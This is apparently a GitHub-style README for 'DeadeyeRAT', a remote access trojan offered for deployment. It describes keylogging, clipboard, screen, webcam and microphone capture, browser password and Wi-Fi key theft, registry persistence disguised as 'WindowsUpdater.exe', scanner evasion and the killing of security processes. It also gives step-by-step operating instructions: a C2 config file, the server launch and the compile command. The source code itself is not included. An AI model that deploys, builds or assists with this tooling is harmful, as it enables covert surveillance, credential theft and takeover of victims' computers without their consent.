# 🎯 DeadeyeRAT v1.0 — Enterprise-Grade Remote Access Framework & C2 Infrastructure

Welcome to the comprehensive technical deployment guide for **DeadeyeRAT**, a modular, high-efficiency Remote Access Trojan (RAT) architecture engineered for low-profile execution, persistent system instrumentation, and synchronized exfiltration control. 

This repository provides an end-to-end framework consisting of a native **Win32 C++ Client**, a lightweight **MASM Assembly Stub**, and a multi-threaded **Python 3 Command & Control (C2) Server**.

---

## 💎 Core Architecture & Capabilities

### ⚡ Evasion & Persistence Engine
*   **Registry Hive Persistence:** Migrates the compiled payload directly into the hidden user configuration directory (`%APPDATA%`) and registers a persistent runtime key within the Windows Registry hive under the system masquerade name `WindowsUpdater.exe`.
*   **Low-Level Assembly Hooking:** Leverages a customized Macro Assembler (`c++.asm`) routine to dynamically resolve core system APIs at runtime, effectively flattening the import address table (IAT) and bypassing static heuristic scanners.
*   **Single-Instance Execution:** Utilizes a system-wide Mutex object (`WindowsUpdateMutex`) to enforce singular host execution and prevent resource conflicts or detection spikes.

### 🕵️ Advanced Surveillance & Monitoring Suite
*   **Asynchronous Keylogger:** Implements a background worker thread executing non-blocking key state polling (`GetAsyncKeyState`) to monitor and log alphanumeric input dynamically.
*   **Live Clipboard Hooking:** Continuously monitors the Windows clipboard buffer interface every 1000ms, capturing active text data, transaction details, and volatile strings.
*   **Synchronized Media Extraction:** Captures desktop frame buffers using native Graphical Device Interface (GDI) context copying (`BitBlt`), leverages PowerShell sub-processes for webcam snapshots, and serializes audio inputs through local microphone controllers.

### 🗄️ Credential Harvesting & System Control
*   **Local Credential Stealer:** Auto-parses browser application profile directories to locate and extract offline local database files containing saved authentication configurations and previously joined Wi-Fi network profile security keys.
*   **Post-Exploitation Interface:** Full remote command shell injection capabilities allowing an operator to list live system tasks, forcibly terminate security processes, alter host system properties, and securely download secondary stage payloads.

---

## 📊 Operator C2 Shell Dashboard

The centralized controller script (`c2.py`) initializes a multi-threaded TCP socket listener, managing stateful active connections and providing the operator with an interactive command-line workspace.

### Infrastructure Management Commands
*   `list` — Renders an aligned dashboard matrix highlighting all active endpoints, their network interfaces, geolocation profiles, and check-in timestamps.
*   `select <client_id>` — Binds the active terminal interface directly to a targeted endpoint to execute focused system instructions.
*   `broadcast <command>` — Distributes an automated instruction string across every active connection concurrently.
*   `exit` — Instructs the master socket to securely terminate network listeners and drop client hooks.

### Interactive Host Sub-Shell Commands

| System Directive | Operational Target | Network Payload Output |
| :--- | :--- | :--- |
| <span style="color:#38bdf8">**SYSINFO**</span> | Queries host OS build version, hardware configurations, and storage capacity. | Raw Data String |
| <span style="color:#38bdf8">**NETINFO**</span> | Maps logical adapter structures, local IP configurations, and hardware MAC targets. | Raw Data String |
| <span style="color:#f43f5e">**SCREENSHOT**</span> | Forces a background frame capture of the current primary monitor screen workspace. | Base64 Encoded `.bmp` |
| <span style="color:#f43f5e">**WEBCAM**</span> | Captures a background snapshot utilizing the device's integrated imaging array. | Base64 Encoded `.jpg` |
| <span style="color:#f43f5e">**MIC &lt;sec&gt;**</span> | Instructs the host soundcard to capture microphone audio for a designated duration. | Base64 Encoded `.wav` |
| <span style="color:#a855f7">**PASSWORDS**</span> | Triggers extraction routines targeting local browser authentication profiles. | Decrypted Log Text |
| <span style="color:#a855f7">**WIFI**</span> | Extracts clear-text configuration profiles for all stored wireless security keys. | Decrypted Log Text |
| <span style="color:#10b981">**EXEC &lt;cmd&gt;**</span> | Forwards a silent command-line argument to run directly inside the system background. | Execution Status |
| <span style="color:#10b981">**DOWNLOAD**</span> | Commands the remote agent to download an external file payload to the local storage. | Execution Status |
| <span style="color:#10b981">**KILL &lt;pid&gt;**</span> | Forcibly stops a targeted host process ID (useful for disabling system defense software). | Execution Status |
| <span style="color:#e11d48">**EXIT**</span> | Triggers an immediate wipe of runtime configurations and forces agent process termination. | Connection Drop |

---

## 🛠️ Step-by-Step Deployment Instructions

### 1. Pre-Deployment Configuration
Prior to generating the operational client payload, update the global environment parameters within the application configuration matrix (`config.json`):

```json
{
  "serverIP": "127.0.0.1",
  "serverPort": 8888,
  "installPath": "%APPDATA%\\WindowsUpdater.exe",
  "startupName": "WindowsUpdater",
  "mutexName": "WindowsUpdateMutex",
  "connectionInterval": 30,
  "maxRetries": 10,
  "keyloggerEnabled": true,
  "clipboardEnabled": true,
  "encryptionKey": "ENTERPRISE_ROTATING_KEY_MASK"
}
```
*Note: The symmetric network stream relies on a fast stream cipher. The configuration key value must precisely match the key hardcoded into the controller application, or the cipher stream will corrupt communications.*

### 2. Launching the Command and Control Infrastructure
Initialize the primary TCP server socket on your host environment or Virtual Private Server (VPS). Ensure firewall boundaries are open to forward traffic through your listening port:

```bash
# Verify environment dependencies and instantiate the listener
python3 c2.py
```
The application will begin monitoring port `8888` for inbound synchronization handshakes.

### 3. Native Agent Compilation
To package the primary C++ engine (`RAT.cpp`) in tandem with the Macro Assembly evasion stub (`c++.asm`), launch a developer shell terminal environment and execute the compiler toolchain, passing optimization flags to strip debug symbols:

```bash
# Execute the MSVC compiler toolchain to package optimized binaries
cl.exe /O2 /MT RAT.cpp /link /SUBSYSTEM:WINDOWS ws2_32.lib wininet.lib urlmon.lib user32.lib gdi32.lib advapi32.lib
```
This build process yields a standalone executable binary ready for direct implementation. Upon execution, the payload automatically maps persistence keys and connects back to the active operator shell.

---

## 📄 Licensing & Technical References
*   **Project License:** This deployment kit is shared under the terms of the open-source [MIT License](https://opensource.org).
*   **Network Layer:** Leverages standard [WinSock2 Infrastructure](https://microsoft.com) for persistent high-throughput communication.
*   **Assembly Core:** Built utilizing standard x86 calling structures via the [Microsoft Macro Assembler (MASM)](https://microsoft.com).
